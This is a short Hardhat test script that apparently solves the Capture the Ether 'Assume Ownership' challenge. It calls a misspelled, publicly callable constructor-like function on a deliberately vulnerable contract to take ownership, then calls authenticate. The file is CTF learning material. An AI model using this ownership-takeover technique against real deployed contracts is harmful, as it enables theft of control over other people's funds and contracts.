import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('AssumeOwnership', function () {
  it('should set owner to caller', async function () {
    const challengeAddress = '0xb700CF055126B3C6372202C748BB3827520330d0';

    const Challenge = await ethers.getContractFactory(
      'AssumeOwnershipChallenge'
    );
    const challenge = Challenge.attach(challengeAddress);

    let tx = await challenge.AssumeOwmershipChallenge();
    await tx.wait();

    tx = await challenge.authenticate();
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
